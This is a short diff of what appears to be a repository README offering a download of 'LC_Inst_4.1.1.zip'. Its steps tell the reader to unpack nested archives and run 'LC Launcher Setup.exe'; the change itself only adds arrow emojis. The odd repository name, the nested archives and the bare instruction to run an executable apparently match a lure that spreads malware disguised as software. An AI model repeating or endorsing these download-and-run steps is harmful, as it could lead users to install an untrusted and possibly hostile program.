@@ -1,7 +1,7 @@
 Download Link = https://github.com/warbles-argyles/Download/releases/download/Download/LC_Inst_4.1.1.zip
 
 How to download:
-1. Download the archive from the link in the description
+1. Download the archive from the link in the description ⤴️ ⤴️ ⤴️
 2. Open archive LC_Inst_4.1.1
 3. Transfer the archive Set_LC_4.1.1 to the desktop and unzip it
 4. Open the folder and run LC Launcher Setup.exe
